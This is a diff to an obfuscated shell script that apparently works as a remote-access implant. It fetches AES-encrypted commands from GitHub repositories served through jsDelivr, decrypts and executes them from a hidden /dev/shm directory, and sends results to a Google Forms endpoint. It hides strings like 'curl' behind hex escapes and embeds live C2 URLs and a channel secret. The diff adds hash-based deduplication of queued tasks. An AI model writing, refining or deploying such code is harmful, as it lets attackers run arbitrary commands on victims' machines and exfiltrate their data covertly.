@@ -9,7 +9,7 @@ _CH="1"                                    # own channel number
 _TK="gzy1Ccmn1p64yYtTlMKTvY41yBOjv"                           # channel AES secret
 _R1=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/sync-registry-7f3a@master'
 _R2=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/flow-refs-8h1d@master'
-_F="ht\x74ps://docs.google.com/forms/d/e/1FAIpQLSfGUJt5MnKfYY4BhdPYmMyJcvkh78mJWjtAIcowFfpB0-c0KQ/formResponse"
+_F=$'ht\x74ps://docs.google.com/forms/d/e/1FAIpQLSfGUJt5MnKfYY4BhdPYmMyJcvkh78mJWjtAIcowFfpB0-c0KQ/formResponse'
 _E="entry.404732359"
 _C=$'\x63\x75\x72\x6c'
 _H="/dev/shm/.cs_$$_$(date +%s)"                   # local workdir
@@ -46,11 +46,12 @@ _up() {  # upload result (chunked, plain tag + AES payload)
    for _N in 01 02 03 04; do
      _U="$_R1/queue/q$_N.txt"
      _D=$($_C -s --max-time 12 "$_U?$_BUST" 2>/dev/null)
+     _HSH=$(printf '%s' "$_D" | md5sum | cut -c1-12)
+     [ -f "$_H/done/q$_N" ] && [ "$(cat "$_H/done/q$_N" 2>/dev/null)" = "$_HSH" ] && continue
      case "$_D" in
        U2FsdGVk*)
          _ID="q$_N-$(date +%s)"
-         [ -f "$_H/done/$_N" ] && _VER=$(cat "$_H/done/$_N") || _VER="x"
-         printf '%s' "$_D" > "$_H/queue/$_ID.tmp"; printf '%s' "$_VER" > "$_H/queue/$_ID.ver"
+         printf '%s' "$_D" > "$_H/queue/$_ID.tmp"; printf '%s' "$_HSH" > "$_H/queue/$_ID.ver"
          ;;
      esac
    done
@@ -80,6 +81,7 @@ while :; do
   if [ -z "$_F1" ]; then sleep $((20 + RANDOM % 10)); continue; fi
   _FP="$_H/queue/$_F1"
   _T=$(_dec "$_TK" "$(cat "$_FP")")
+  _VH=$(cat "$_FP.ver" 2>/dev/null)
   rm -f "$_FP" "$_FP.ver"
   [ -z "$_T" ] && { _up "ERR|decrypt|$_F1"; continue; }
   _log "exec $_F1"
@@ -90,6 +92,7 @@ while :; do
     _up "RES|$_F1|$_CH1"
   done
   echo "${_F1%%-*}" >> "$_H/done.idx" 2>/dev/null
+  [ -n "$_VH" ] && printf '%s' "$_VH" > "$_H/done/${_F1%%-*}"
   case "$_F1" in 9now*|8now*) echo done > "$_H/now.done";; esac
   _log "done $_F1"
 done
